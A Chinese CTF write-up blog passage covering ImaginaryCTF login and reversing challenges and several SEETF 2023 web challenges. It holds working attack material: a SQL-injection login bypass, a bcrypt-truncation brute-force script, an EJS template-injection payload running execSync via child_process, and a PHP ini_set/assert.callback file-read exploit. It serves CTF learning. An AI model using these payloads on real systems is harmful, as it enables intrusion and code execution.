<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo password_hash(&quot;a&quot;, PASSWORD_DEFAULT);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">password_verify</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;<span class="subst">$2y</span><span class="subst">$10</span><span class="subst">$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiCO</span>&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过对username的注入登录到admin，获取到magic<code>688a35c685a7a654abc80f8e123ad9f0 </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=a&amp;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS username,&#x27;$2y$10$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiCO&#x27; AS pwhash/*</span><br></pre></td></tr></table></figure>
<p>根据<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify</a></p>
<p>只能判断前72个字符，那么就可以开始爆破了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&quot;</span></span><br><span class="line"></span><br><span class="line">able = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|~&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ictf&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    length = <span class="number">71</span> - <span class="built_in">len</span>(flag)</span><br><span class="line">    password = <span class="string">&quot;a&quot;</span> * length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> able:</span><br><span class="line">        guess = password + flag + i</span><br><span class="line">        <span class="built_in">hash</span> = os.popen(<span class="string">f&quot;php exp.php <span class="subst">&#123;guess&#125;</span>&quot;</span>).read()</span><br><span class="line">        headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;  <span class="comment"># need for it</span></span><br><span class="line">        data = <span class="string">f&quot;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS username,&#x27;<span class="subst">&#123;<span class="built_in">hash</span>&#125;</span>&#x27; AS pwhash/*&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span></span><br><span class="line">        r = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>:] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">password_hash</span>(<span class="variable">$argv</span>[<span class="number">1</span>], PASSWORD_DEFAULT);</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230724124904514.png" alt="image-20230724124904514" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&gt;| 这三个在命令行会直接报错，如果之后遇到flag中有，又需要用命令行的可能需要特殊处理</span><br></pre></td></tr></table></figure>
<h1>Re</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">b</span>):</span><br><span class="line"> a = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(b[<span class="number">0</span>]*<span class="number">2</span>**<span class="number">24</span>+b[<span class="number">1</span>]*<span class="number">2</span>**<span class="number">16</span>+b[<span class="number">2</span>]*<span class="number">2</span>**<span class="number">8</span>+b[<span class="number">3</span>]+<span class="number">1</span>)][<span class="number">1</span>:]</span><br><span class="line"> c,i = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>([n <span class="keyword">for</span> n <span class="keyword">in</span> a <span class="keyword">if</span> n != <span class="number">0</span>]) &gt; <span class="number">1</span>:</span><br><span class="line">  i%=<span class="built_in">len</span>(a)</span><br><span class="line">  <span class="keyword">if</span> (a[i]!=<span class="number">0</span> <span class="keyword">and</span> c==<span class="number">1</span>):</span><br><span class="line">   a[i],c=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> (a[i] != <span class="number">0</span>):</span><br><span class="line">   c+=<span class="number">1</span></span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">sum</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    .----.   @   @</span></span><br><span class="line"><span class="string">   / .-&quot;-.`.  \v/</span></span><br><span class="line"><span class="string">   | | &#x27;\ \ \_/ )</span></span><br><span class="line"><span class="string"> ,-\ `-.&#x27; /.&#x27;  /</span></span><br><span class="line"><span class="string">&#x27;---`----&#x27;----&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;Enter flag here: &quot;</span>).encode()</span><br><span class="line">out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [flag[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>)]:</span><br><span class="line">  out += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(enc(n[::-<span class="number">1</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> out == <span class="string">b&#x27;L\xe8\xc6\xd2f\xde\xd4\xf6j\xd0\xe0\xcad\xe0\xbe\xe6J\xd8\xc4\xde`\xe6\xbe\xda&gt;\xc8\xca\xca^\xde\xde\xc4^\xde\xde\xdez\xe8\xe6\xde&#x27;</span>:</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;[*] Flag correct!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;[*] Flag incorrect.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>本质上是对enc函数的简化，通过测试找规律</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1 3</span><br><span class="line">1 3 5 7</span><br><span class="line">1 3 5 7 9 11 13 15</span><br><span class="line">1 3 5 7 9 11 13 15 17 19 21 23 25 .....</span><br></pre></td></tr></table></figure>
<p>从数字二开始就呈现这样的数字规律</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">b</span>):</span><br><span class="line">    a = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(b)][<span class="number">1</span>:]</span><br><span class="line">    c, i = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>([n <span class="keyword">for</span> n <span class="keyword">in</span> a <span class="keyword">if</span> n != <span class="number">0</span>]) &gt; <span class="number">1</span>:</span><br><span class="line">        i %= <span class="built_in">len</span>(a)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span> <span class="keyword">and</span> c == <span class="number">1</span>):</span><br><span class="line">            a[i], c = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>):</span><br><span class="line">            c += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>(<span class="params">n</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    n = n - <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3000</span>):</span><br><span class="line">        x += <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">        <span class="keyword">if</span> n &lt; x:</span><br><span class="line">            x -= <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (n - x) * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(num(i), i)</span></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(enc(i), i)</span></span><br></pre></td></tr></table></figure>
<p>然后写出简化的函数，测试第一个块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">b&#x27;L\xe8\xc6\xd2&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(x), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
<p>是偶数，所以重新稍微修改函数返回值和结构，然后生成4字符的全部组合和数值即可</p>
<p><a href="http://xn--exp-dw1e34jo72bxk5d.py">最后全部exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">b</span>):</span><br><span class="line">    a = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(b)][<span class="number">1</span>:]</span><br><span class="line">    c, i = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>([n <span class="keyword">for</span> n <span class="keyword">in</span> a <span class="keyword">if</span> n != <span class="number">0</span>]) &gt; <span class="number">1</span>:</span><br><span class="line">        i %= <span class="built_in">len</span>(a)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span> <span class="keyword">and</span> c == <span class="number">1</span>):</span><br><span class="line">            a[i], c = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>):</span><br><span class="line">            c += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>(<span class="params">b</span>):</span><br><span class="line">    n = b[<span class="number">0</span>] * <span class="number">2</span> ** <span class="number">24</span> + b[<span class="number">1</span>] * <span class="number">2</span> ** <span class="number">16</span> + b[<span class="number">2</span>] * <span class="number">2</span> ** <span class="number">8</span> + b[<span class="number">3</span>] + <span class="number">1</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    n = n - <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3000</span>):</span><br><span class="line">        x += <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">        <span class="keyword">if</span> n &lt; x:</span><br><span class="line">            x -= <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>((n - x) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(num(i), i)</span></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(enc(i), i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># x = b&#x27;L\xe8\xc6\xd2&#x27;</span></span><br><span class="line"><span class="comment"># print(int(bytes.hex(x), 16))</span></span><br><span class="line"><span class="comment"># flag = b&#x27;ictf&#x27;</span></span><br><span class="line"><span class="comment"># for n in [flag[i:i+4] for i in range(0,len(flag),4)]:</span></span><br><span class="line"><span class="comment">#     print(num(n[::-1]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = (string.digits + string.ascii_letters + <span class="string">&quot;&#123;_&#125;&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;all.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">                x = (i+j+k+l).encode()</span><br><span class="line">                f.write(num(x[::-<span class="number">1</span>]) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(i + j + k + l) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">flag = <span class="string">b&#x27;L\xe8\xc6\xd2f\xde\xd4\xf6j\xd0\xe0\xcad\xe0\xbe\xe6J\xd8\xc4\xde`\xe6\xbe\xda&gt;\xc8\xca\xca^\xde\xde\xc4^\xde\xde\xdez\xe8\xe6\xde&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [flag[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>)]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(n), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
<p>ctrl+f就行了</p>
]]></content>
      <categories>
        <category>2023wp</category>
      </categories>
      <tags>
        <tag>2023ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023SEETF</title>
    <url>/2023/08/18/13-21-58/</url>
    <content><![CDATA[<h1>2023SEETF</h1>
<span id="more"></span>
<h2 id="Express-JavaScript-Security">Express JavaScript Security</h2>
<p>这题算是我学会怎么去调试一个js后端的一个开始</p>
<p>在vscode中的调试选项中新建一个node.js调试配置，并且更改配置如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span>   <span class="comment">//启动方式</span></span><br><span class="line">      <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Launch Program&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/main.js&quot;</span><span class="punctuation">,</span> <span class="comment">//入口文件</span></span><br><span class="line">      <span class="attr">&quot;skipFiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  <span class="comment">//跳过文件</span></span><br><span class="line">        <span class="comment">// &quot;&lt;node_internals&gt;/**&quot;  </span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      </span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>记得把skipFiles注释掉就行了，然后就可以愉快的调试了</p>
<p><img src="/img/image-20230818134152536.png" alt="image-20230818134152536" /></p>
<p>在这里下一个断点，然后正常去访问页面，会调用render，将get的参数传入</p>
<p><img src="/img/image-20230818134331920.png" alt="image-20230818134331920" /></p>
<p>不断进行F11，下面在ejs.js进行了一些判断</p>
<p><img src="/img/image-20230818140144925.png" alt="image-20230818140144925" /></p>
<p><img src="/img/image-20230818141947687.png" alt="image-20230818141947687" /></p>
<p><img src="/img/image-20230818142052534.png" alt="image-20230818142052534" /></p>
<p>最后会生成一个文件</p>
<p><img src="/img/image-20230818140632625.png" alt="image-20230818140632625" /></p>
<p>简单来说，setting的参数会被赋值到options，然后通过改变setting的参数使得生成的模板可以执行代码，需要利用的就是</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">options.<span class="property">client</span> = opts.<span class="property">client</span> || <span class="literal">false</span>;</span><br><span class="line">options.<span class="property">escapeFunction</span> = opts.<span class="property">escape</span> || opts.<span class="property">escapeFunction</span> || utils.<span class="property">escapeXML</span>;</span><br></pre></td></tr></table></figure>
<p>也就是说利用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">viewOpts = data. settings[<span class="string">&#x27;view options&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (viewOpts) &#123;</span><br><span class="line">          utils.<span class="title function_">shallowCopy</span>(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这代码会将view options的键值对赋值给opts然后传递给options，之后对其中的值进行判断再还给opts然后对opts进行处理生成文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">client</span>) &#123;</span><br><span class="line">      src = <span class="string">&#x27;escapeFn = escapeFn || &#x27;</span> + escapeFn.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      <span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">        src = <span class="string">&#x27;rethrow = rethrow || &#x27;</span> + rethrow.<span class="title function_">toString</span>() + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span> + src;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>如果传入的client的值为真，会将escapeFn传入生成的模板中，然后在生成的模板文件中如果注入恶意代码就可以进行RCE了</p>
<p><a href="https://github.com/mde/ejs/issues/735">EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) · Issue #735 · mde/ejs · GitHub</a></p>
<p>然后使用escape绕过黑名单就可以了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//127.0.0.1:3000/greet?name=q&amp;font=Arial&amp;fontSize=20&amp;settings[view options][client]=true&amp;settings[view options][escape]=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);</span></span><br></pre></td></tr></table></figure>
<h2 id="Sourceful-Guessless-Web">Sourceful Guessless Web</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"><span class="variable">$flag</span> =  <span class="string">&quot;SEE&#123;FAKE_FLAG&#125;&quot;</span>; <span class="comment">// Oops, my dog ate my flag...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^SEE&#123;.*&#125;$/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;config&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;config&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">ini_set</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^SEE&#123;.*&#125;$/&quot;</span>, <span class="variable">$flag</span>), <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>这里需要flag能够匹配SEE{}这样的形式，然后会触发assert断言</p>
<p>那么对于preg_match可以通过设置pcre.backtrack_limit的回溯次数来进行绕过，如果设置为0，那么就说明不会进行匹配，将返回0，触发assert错误，那么对于assert相关设置<a href="https://www.php.net/manual/zh/info.configuration.php#ini.assert.callback">PHP: 运行时配置 - Manual</a></p>
<p>可以查看官方文档，</p>
<p>通过设置<code>assert.callback</code> string</p>
<p>断言失败后要调用的回调函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// This is our function to handle</span><br><span class="line">// assert failures</span><br><span class="line">function assert_failure($file, $line, $assertion, $message)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The assertion $assertion in $file on line $line has failed: $message&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is our test function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Set our assert options</span><br><span class="line">assert_options(ASSERT_ACTIVE,   true);</span><br><span class="line">assert_options(ASSERT_BAIL,     true);</span><br><span class="line">assert_options(ASSERT_WARNING,  false);</span><br><span class="line">assert_options(ASSERT_CALLBACK, &#x27;assert_failure&#x27;);</span><br><span class="line"></span><br><span class="line">// Make an assert that would fail</span><br><span class="line">assert(0);</span><br><span class="line"></span><br><span class="line">// This is never reached due to ASSERT_BAIL</span><br><span class="line">// being true</span><br><span class="line">echo &#x27;Never reached&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>那么就可以构造出exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=SEE&#123;szdc&#125;&amp;debug=1&amp;config[pcre.backtrack_limit]=0&amp;config[assert.callback]=readfile</span><br></pre></td></tr></table></figure>
<h2 id="福">福</h2>
<p>参考：<a href="https://github.com/Social-Engineering-Experts/SEETF-2023-Public/blob/2588dd0358cb83c8e7c6eb63743c2fe90e35a5b1/challs/web/%E7%A6%8F/README.md">https://github.com/Social-Engineering-Experts/SEETF-2023-Public/blob/2588dd0358cb83c8e7c6eb63743c2fe90e35a5b1/challs/web/福/README.md</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">	contents = flag.read()</span><br><span class="line">	福 = contents.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">a_value, b_value, c_value, d_value, f_value</span>):</span><br><span class="line">	<span class="comment"># Create the variables</span></span><br><span class="line">	a, b, c, d, e, f = Ints(<span class="string">&#x27;a b c d e f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Set the relationships between the variables</span></span><br><span class="line">	constraints = [And(<span class="number">8</span> &lt;= v) <span class="keyword">for</span> v <span class="keyword">in</span> [a, b, c, d, e, f]]</span><br><span class="line">	constraints += [a == a_value] </span><br><span class="line">	constraints += [b == b_value]</span><br><span class="line">	constraints += [c == c_value]</span><br><span class="line">	constraints += [d == d_value]</span><br><span class="line">	constraints += [f == f_value]</span><br><span class="line">	constraints += [(a ** <span class="number">3</span>) * (b**<span class="number">2</span> + c**<span class="number">2</span>) * (<span class="number">2</span>*d + <span class="number">1</span>) == (e**<span class="number">3</span>) + (f**<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Find a satisfying solution</span></span><br><span class="line">	s = Solver()</span><br><span class="line">	s.add(constraints)</span><br><span class="line">	<span class="keyword">if</span> s.check() == sat:</span><br><span class="line">		m = s.model()</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">int</span>(m[e].as_long())</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_cookie</span>(<span class="params">signed_cookie</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		compressed = <span class="literal">False</span></span><br><span class="line">		<span class="keyword">if</span> signed_cookie.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">			compressed = <span class="literal">True</span></span><br><span class="line">			signed_cookie = signed_cookie[<span class="number">1</span>:]</span><br><span class="line">		data = signed_cookie.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">		data = base64_decode(data)</span><br><span class="line">		<span class="keyword">if</span> compressed:</span><br><span class="line">			data = zlib.decompress(data)</span><br><span class="line">		<span class="keyword">return</span> json.loads(data.decode())</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace_secret_key</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;key&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;key&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> keys:</span><br><span class="line">		keys.append(session[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">		app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = session[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;session&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> <span class="string">&#x27;end&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		new_session = session[<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">		session.update(decrypt_cookie(new_session))</span><br><span class="line">		replace_secret_key()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">key</span>):</span><br><span class="line">	random.seed(key)</span><br><span class="line">	<span class="keyword">return</span> random.randint(<span class="number">8</span>, <span class="number">88888</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/福&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fortold</span>():</span><br><span class="line">	keys.clear()</span><br><span class="line">	start = request.form.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">	app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = start</span><br><span class="line">	replace_secret_key()</span><br><span class="line"></span><br><span class="line">	value = [secret(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">	result = solve(*value)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">eval</span>(<span class="built_in">chr</span>(result))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Bad Luck.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	serve(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先看一下</p>
